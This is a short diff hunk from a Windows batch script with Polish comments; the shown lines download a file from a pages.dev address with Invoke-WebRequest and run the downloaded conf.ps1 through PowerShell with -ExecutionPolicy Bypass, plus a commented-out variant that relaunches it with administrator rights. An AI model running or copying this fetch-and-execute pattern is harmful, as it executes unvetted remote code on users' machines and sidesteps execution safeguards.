@@ -24,7 +24,7 @@ powershell -Command "Invoke-WebRequest -Uri 'https://asius.pages.dev/romperdownl
 :: dupadupa
 
 :: Uruchamianie pobranego skryptu PowerShell
-powershell -ExecutionPolicy Bypass -File "%APP_FOLDER%\conf.ps1"
+pwsh.exe -ExecutionPolicy Bypass -File "%APP_FOLDER%\conf.ps1"
 
 ::pwsh.exe -NoProfile -ExecutionPolicy Bypass -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File ""%APP_FOLDER%\conf.ps1""' -Verb RunAs}"
 
